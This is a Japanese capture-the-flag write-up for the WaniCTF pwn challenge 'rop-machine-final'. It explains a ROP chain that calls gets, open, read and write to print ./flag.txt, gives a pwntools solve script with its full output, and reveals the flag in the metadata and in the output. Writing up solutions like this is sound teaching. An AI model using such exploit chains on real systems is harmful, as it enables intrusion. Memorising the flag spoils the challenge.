---
title: rop-machine-final
level: 4
flag: FLAG{you-might-be-the-real-rop-master}
badge: true
writer: saru
---


# rop-machine-final [pwn]
## 問題文

```
nc rop-machine-final.pwn.wanictf.org 9005
```

### ヒント

+ ./flag.txtにフラグが書かれています。
+ "buf"のアドレスは提供されています。
+ rop machineの使い方->[wani-hackase/rop-machine](https://github.com/wani-hackase/rop-machine/)
+ sample.pyを使うと楽です。

### 使用ツール例
+ [pwntools](https://github.com/wani-hackase/memo-setup-pwn-utils#pwntools)

## 解法

ROPで今まで見た中で最も複雑だなーと思ったやつをrop-machineで出してみました。
heap問の基本であるbaby heapよりも解けている人が少なかったので難易度的にはちょうど良かったかなと思ってます。
ポイントは2点で、
1. gets関数でユーザが入力した文字列を任意のアドレスに書き込む
2. open関数で開いたファイルのファイルディスクリプタが0 (標準入力)、1 (標準出力)、2 (標準エラー出力)に続いて3から連続して割り当てられるという仕様を利用してファイルディスクリプタ3に対してread関数を実行する

の2つです。

実現すべき処理は以下の通りです。

```
gets(buf); // 標準入力に「./flag.txt」を入力
open(buf,0, 0); // ./flag.txtを開く。ファイル識別子は3が割り当てられる。
read(3, buf, 128); // ファイル識別子3からbufに128文字読み込む
write(1, buf, 128); // 標準出力(1)にbufから128文字書き出す
```

今回のROPは長いので、pwn toolsを使ったsample.pyを拡張すると楽です。

## sample.pyを拡張した部分

```
io = pwn.remote("rop-machine-final.pwn.wanictf.org", 9005)
# io = pwn.process("./final")

ret = read_until(b">")

cmd_append_pop_rdi()
cmd_append_hex(0x404140)
cmd_append_gets()

cmd_append_pop_rdi()
cmd_append_hex(0x404140)
cmd_append_pop_rsi()
cmd_append_hex(0)
cmd_append_pop_rdx()
cmd_append_hex(0)
cmd_append_open()

cmd_append_pop_rdi()
cmd_append_hex(3)
cmd_append_pop_rsi()
cmd_append_hex(0x404140)
cmd_append_pop_rdx()
cmd_append_hex(128)
cmd_append_read()

cmd_append_pop_rdi()
cmd_append_hex(1)
cmd_append_pop_rsi()
cmd_append_hex(0x404140)
cmd_append_pop_rdx()
cmd_append_hex(128)
cmd_append_write()

cmd_execute()
```

## 実行結果

```

$ python ./solve.py
/home/saru/miniconda3/lib/python3.8/site-packages/requests/__init__.py:89: RequestsDependencyWarning: urllib3 (1.26.7) or chardet (3.0.4) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
[+] Opening connection to rop-machine-final.pwn.wanictf.org on port 9005: Done
 cmd = 0x2
"pop rdi; ret" addr is appended
>
0x0000000000404140 is appended
>
 cmd = 0x5
"gets" addr is appended
>
 cmd = 0x2
"pop rdi; ret" addr is appended
>
0x0000000000404140 is appended
>
 cmd = 0x3
"pop rsi; ret" addr is appended
>
0x0000000000000000 is appended
>
 cmd = 0x4
"pop rdx; ret" addr is appended
>
0x0000000000000000 is appended
>
 cmd = 0x6
"open" addr is appended
>
 cmd = 0x2
"pop rdi; ret" addr is appended
>
0x0000000000000003 is appended
>
 cmd = 0x3
"pop rsi; ret" addr is appended
>
0x0000000000404140 is appended
>
 cmd = 0x4
"pop rdx; ret" addr is appended
>
0x0000000000000080 is appended
>
 cmd = 0x7
"read" addr is appended
>
 cmd = 0x2
"pop rdi; ret" addr is appended
>
0x0000000000000001 is appended
>
 cmd = 0x3
"pop rsi; ret" addr is appended
>
0x0000000000404140 is appended
>
 cmd = 0x4
"pop rdx; ret" addr is appended
>
0x0000000000000080 is appended
>
 cmd = 0x8
"write" addr is appended
>
[*] Switching to interactive mode
 cmd = 0x0
             rop_arena
+-----------------------------------+
| 0x000000000040138c (pop rdi; ret) |<- rop start
+-----------------------------------+
| 0x0000000000000000000000000404140 |
+-----------------------------------+
| 0x00007fe28c80c190 (gets        ) |
+-----------------------------------+
| 0x000000000040138c (pop rdi; ret) |
+-----------------------------------+
| 0x0000000000000000000000000404140 |
+-----------------------------------+
| 0x0000000000401399 (pop rsi; ret) |
+-----------------------------------+
| 0x0000000000000000000000000000000 |
+-----------------------------------+
| 0x00000000004013a6 (pop rdx; ret) |
+-----------------------------------+
| 0x0000000000000000000000000000000 |
+-----------------------------------+
| 0x00007fe28c89bd10 (open        ) |
+-----------------------------------+
| 0x000000000040138c (pop rdi; ret) |
+-----------------------------------+
| 0x0000000000000000000000000000003 |
+-----------------------------------+
| 0x0000000000401399 (pop rsi; ret) |
+-----------------------------------+
| 0x0000000000000000000000000404140 |
+-----------------------------------+
| 0x00000000004013a6 (pop rdx; ret) |
+-----------------------------------+
| 0x0000000000000000000000000000080 |
+-----------------------------------+
| 0x00007fe28c89c140 (read        ) |
+-----------------------------------+
| 0x000000000040138c (pop rdi; ret) |
+-----------------------------------+
| 0x0000000000000000000000000000001 |
+-----------------------------------+
| 0x0000000000401399 (pop rsi; ret) |
+-----------------------------------+
| 0x0000000000000000000000000404140 |
+-----------------------------------+
| 0x00000000004013a6 (pop rdx; ret) |
+-----------------------------------+
| 0x0000000000000000000000000000080 |
+-----------------------------------+
| 0x00007fe28c89c210 (write       ) |
+-----------------------------------+
$ ./flag.txt
FLAG{you-might-be-the-real-rop-master}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Segmentation fault (core dumped)
[*] Got EOF while reading in interactive
$
```
